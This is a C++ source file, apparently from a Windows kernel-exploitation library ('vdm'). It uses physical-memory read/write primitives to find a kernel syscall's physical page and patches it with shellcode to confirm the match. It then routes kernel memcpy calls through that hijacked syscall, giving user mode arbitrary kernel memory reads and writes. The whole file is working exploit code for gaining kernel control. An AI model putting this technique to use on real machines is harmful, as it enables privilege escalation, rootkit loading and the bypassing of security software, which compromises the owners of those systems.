#include "vdm_ctx.hpp"

namespace vdm
{
	vdm_ctx::vdm_ctx(read_phys_t& read_func, write_phys_t& write_func)
		:
		read_phys(read_func),
		write_phys(write_func)
	{
		// already found the syscall's physical page...
		if (vdm::syscall_address.load())
			return;

		vdm::ntoskrnl = reinterpret_cast<std::uint8_t*>(
			LoadLibraryExA("ntoskrnl.exe", NULL,
				DONT_RESOLVE_DLL_REFERENCES));

		nt_rva = reinterpret_cast<std::uint32_t>(
			util::get_kmodule_export(
				"ntoskrnl.exe",
				syscall_hook.first,
				true
			));

		vdm::nt_page_offset = nt_rva % PAGE_4KB;
		std::vector<std::thread> search_threads;

		for (auto ranges : util::pmem_ranges)
			search_threads.emplace_back(std::thread(
				&vdm_ctx::locate_syscall,
				this,
				ranges.first,
				ranges.second
			));

		for (std::thread& search_thread : search_threads)
			search_thread.join();
	}

	void vdm_ctx::set_read(read_phys_t& read_func)
	{
		this->read_phys = read_func;
	}

	void vdm_ctx::set_write(write_phys_t& write_func)
	{
		this->write_phys = write_func;
	}

	void vdm_ctx::rkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		this->syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	void vdm_ctx::wkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		this->syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	void vdm_ctx::locate_syscall(std::uintptr_t address, std::uintptr_t length) const
	{
		const auto page_data =
			reinterpret_cast<std::uint8_t*>(
				VirtualAlloc(
					nullptr,
					PAGE_4KB, MEM_COMMIT | MEM_RESERVE,
					PAGE_READWRITE
				));

		// accesses the page in order to make PTE...
		memset(page_data, NULL, PAGE_4KB);
		for (auto page = 0u; page < length; page += PAGE_4KB)
		{
			if (vdm::syscall_address.load())
				break;

			if (!read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
				continue;

			// check the first 32 bytes of the syscall, if its the same, test that its the correct
			// occurrence of these bytes (since dxgkrnl is loaded into physical memory at least 2 times now)...
			if (!memcmp(page_data + nt_page_offset, ntoskrnl + nt_rva, 32))
				if (valid_syscall(reinterpret_cast<void*>(address + page + nt_page_offset)))
					syscall_address.store(
						reinterpret_cast<void*>(
							address + page + nt_page_offset));
		}
		VirtualFree(page_data, PAGE_4KB, MEM_DECOMMIT);
	}

	bool vdm_ctx::valid_syscall(void* syscall_addr) const
	{
		static std::mutex syscall_mutex;
		syscall_mutex.lock();

		static const auto proc =
			GetProcAddress(
				LoadLibraryA(syscall_hook.second),
				syscall_hook.first
			);

		// 0:  48 31 c0    xor rax, rax
		// 3 : c3          ret
		std::uint8_t shellcode[] = { 0x48, 0x31, 0xC0, 0xC3 };
		std::uint8_t orig_bytes[sizeof shellcode];

		// save original bytes and install shellcode...
		read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
		write_phys(syscall_addr, shellcode, sizeof shellcode);

		auto result = reinterpret_cast<NTSTATUS(__fastcall*)(void)>(proc)();
		write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
		syscall_mutex.unlock();
		return result == STATUS_SUCCESS;
	}
}